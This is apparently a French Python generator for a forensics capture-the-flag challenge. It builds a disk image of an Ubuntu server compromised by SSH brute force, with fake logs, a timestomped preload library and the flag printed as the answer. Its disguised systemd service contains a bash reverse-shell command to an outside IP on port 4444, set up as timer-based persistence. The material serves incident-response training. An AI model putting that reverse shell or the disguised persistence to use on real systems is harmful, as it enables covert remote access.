#!/usr/bin/env python3
"""Genere le defi serveur-compromis (image disque ext4, investigation IR).

Scenario : serveur Ubuntu compromis par brute-force SSH. Le joueur reconstitue
la chaine d'attaque a partir des artefacts (aucun flag stocke en clair) :
  FPS{<compte_compromis>_<unite_persistance>_<port_C2>}

Artefacts : auth.log (+ rotations) -> compte compromis ; sudoers.d ; timer
systemd deguise (persistance) -> port C2 ; ld.so.preload ; .so timestompe
(crtime incoherent) ; bash_history vide (anti-forensic) ; /var/tmp/.cache/x.enc
(archive chiffree -> lien vers F5).
"""
import gzip
import os
import random
import subprocess
import sys
from datetime import datetime, timedelta

HERE = os.path.dirname(os.path.abspath(__file__))
DEFI = os.path.normpath(os.path.join(HERE, "..", "defi"))
STAGE = os.path.join(HERE, "_root")
IMG = os.path.join(DEFI, "serveur.img")

sys.path.insert(0, os.path.join(HERE, "..", "..", "memoire-vive", "solution"))
import shared_secret  # noqa: E402

ACCOUNT = "webadmin"
UNIT = "apt-daily-cleanup"       # imposteur (vrais units: apt-daily, apt-daily-upgrade)
C2_IP = "185.220.101.52"
C2_PORT = 4444
FLAG = f"FPS{{{ACCOUNT}_{UNIT}_{C2_PORT}}}"
HOST = "srv-app-01"
BREACH = datetime(2026, 9, 15, 3, 47, 12)  # instant de la compromission


def w(path, content, mode="w"):
    full = os.path.join(STAGE, path)
    os.makedirs(os.path.dirname(full), exist_ok=True)
    with open(full, mode if "b" in mode else "w",
              **({} if "b" in mode else {"newline": "\n"})) as f:
        f.write(content)


def gen_authlog():
    rng = random.Random(7)
    attacker = C2_IP
    victims = ["root", "admin", "test", "ubuntu", "oracle", "postgres",
               "git", "deploy", ACCOUNT]
    lines, t = [], BREACH - timedelta(minutes=22)
    # brute-force : rafales d'echecs
    for _ in range(420):
        t += timedelta(seconds=rng.randint(1, 5))
        u = rng.choice(victims)
        invalid = "invalid user " if u in ("test", "oracle", "git") else ""
        port = rng.randint(40000, 61000)
        lines.append(
            f"{t:%b %e %H:%M:%S} {HOST} sshd[{rng.randint(1000,9999)}]: "
            f"Failed password for {invalid}{u} from {attacker} port {port} ssh2")
    # connexion reussie du compte compromis
    t = BREACH
    pid = rng.randint(2000, 9999)
    lines.append(f"{t:%b %e %H:%M:%S} {HOST} sshd[{pid}]: "
                 f"Accepted password for {ACCOUNT} from {attacker} "
                 f"port {rng.randint(40000,61000)} ssh2")
    lines.append(f"{t:%b %e %H:%M:%S} {HOST} sshd[{pid}]: "
                 f"pam_unix(sshd:session): session opened for user {ACCOUNT} "
                 f"by (uid=0)")
    t += timedelta(seconds=8)
    lines.append(f"{t:%b %e %H:%M:%S} {HOST} sudo: {ACCOUNT} : TTY=pts/0 ; "
                 f"PWD=/home/{ACCOUNT} ; USER=root ; COMMAND=/bin/bash")
    return "\n".join(lines) + "\n"


def main():
    if os.path.exists(STAGE):
        subprocess.run(["rm", "-rf", STAGE])
    os.makedirs(STAGE)
    os.makedirs(DEFI, exist_ok=True)

    # --- base systeme plausible ---
    w("etc/hostname", HOST + "\n")
    w("etc/os-release",
      'PRETTY_NAME="Ubuntu 22.04.4 LTS"\nNAME="Ubuntu"\nVERSION_ID="22.04"\n'
      'VERSION="22.04.4 LTS (Jammy Jellyfish)"\nID=ubuntu\n')
    w("etc/passwd",
      "root:x:0:0:root:/root:/bin/bash\n"
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
      "deploy:x:1000:1000:Deploy:/home/deploy:/bin/bash\n"
      f"{ACCOUNT}:x:1001:1001:Web Admin:/home/{ACCOUNT}:/bin/bash\n")
    w("etc/shadow",
      "root:!:19500:0:99999:7:::\n"
      f"{ACCOUNT}:$6$rounds=656000$abcd$1a2b3c:19600:0:99999:7:::\n"
      "deploy:$6$xyz$9z8y7x:19600:0:99999:7:::\n")

    # --- auth.log + rotations ---
    auth = gen_authlog()
    w("var/log/auth.log", auth)
    w("var/log/auth.log.1",
      "Sep 13 06:25:01 srv-app-01 CRON[1123]: pam_unix(cron:session): "
      "session opened for user root by (uid=0)\n"
      "Sep 13 06:25:01 srv-app-01 CRON[1123]: pam_unix(cron:session): "
      "session closed for user root\n")
    with open(os.path.join(STAGE, "var/log/auth.log.2.gz"), "wb") as f:
        f.write(gzip.compress(
            b"Sep 12 02:17:01 srv-app-01 CRON[980]: (root) CMD (cd / && "
            b"run-parts --report /etc/cron.hourly)\n"))

    # --- persistance : timer + service systemd deguises ---
    w(f"etc/systemd/system/{UNIT}.timer",
      "[Unit]\nDescription=Daily apt cleanup helper\n\n"
      "[Timer]\nOnCalendar=*-*-* *:*:00\nPersistent=true\n\n"
      "[Install]\nWantedBy=timers.target\n")
    w(f"etc/systemd/system/{UNIT}.service",
      "[Unit]\nDescription=Daily apt cleanup helper\n\n"
      "[Service]\nType=oneshot\n"
      f"ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{C2_IP}/{C2_PORT} 0>&1'\n")
    # lien symbolique d'activation (fichier regulier suffisant pour l'indice)
    w("etc/systemd/system/timers.target.wants/.keep", "")

    # --- ld.so.preload + .so timestompe ---
    w("etc/ld.so.preload", "/usr/lib/.cache/libncurse.so\n")
    # faux .so (entete ELF + bourrage)
    elf = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + b"\x03\x00\x3e\x00" + \
        b"PRELOAD-HIJACK".ljust(512, b"\x00")
    w("usr/lib/.cache/libncurse.so", elf, "wb")

    # --- anti-forensic : historique vide ---
    w(f"home/{ACCOUNT}/.bash_history", "")
    w(f"home/{ACCOUNT}/.bashrc", "# ~/.bashrc\nexport PS1='\\u@\\h:\\w\\$ '\n")
    w("home/deploy/.bash_history",
      "cd /srv/app\ngit pull\nsystemctl restart app\n")
    w("root/.bash_history", "apt update\napt upgrade -y\nreboot\n")

    # --- archive chiffree (lien F5) ---
    inner = gzip.compress(
        b"second-stage exfiltration bundle\n"
        b"decrypt key held in volatile memory only\n"
        b"flag: " + shared_secret.F5_FLAG.encode() + b"\n")
    w("var/tmp/.cache/x.enc", shared_secret.encrypt(inner), "wb")

    # --- un peu de contenu applicatif pour le realisme ---
    w("srv/app/config.yml",
      "app:\n  name: facturation\n  port: 8080\n  db: postgres://db.corp.local/app\n")
    w("var/log/syslog",
      "Sep 15 03:50:02 srv-app-01 systemd[1]: Started Daily apt cleanup helper.\n")

    # --- fabrication image ext4 (populate via mke2fs -d) ---
    if os.path.exists(IMG):
        os.remove(IMG)
    subprocess.run(["dd", "if=/dev/zero", f"of={IMG}", "bs=1M", "count=96"],
                   check=True, capture_output=True)
    subprocess.run(["mke2fs", "-t", "ext4", "-L", "root", "-d", STAGE, "-F",
                    "-q", IMG], check=True)

    # --- timestomp du .so : mtime/atime/ctime recules, crtime les trahit ---
    old = "20250103120000"  # mtime affiche (ancien)
    for field in ("mtime", "atime", "ctime"):
        subprocess.run(
            ["debugfs", "-w", "-R",
             f"set_inode_field /usr/lib/.cache/libncurse.so {field} {old}", IMG],
            check=True, capture_output=True)
    # crtime (cree reellement le 2026-09-15) reste -> incoherence revelatrice
    crt = BREACH.strftime("%Y%m%d%H%M%S")
    subprocess.run(
        ["debugfs", "-w", "-R",
         f"set_inode_field /usr/lib/.cache/libncurse.so crtime {crt}", IMG],
        check=True, capture_output=True)

    print("image generee:", IMG)
    print("flag:", FLAG)


if __name__ == "__main__":
    main()
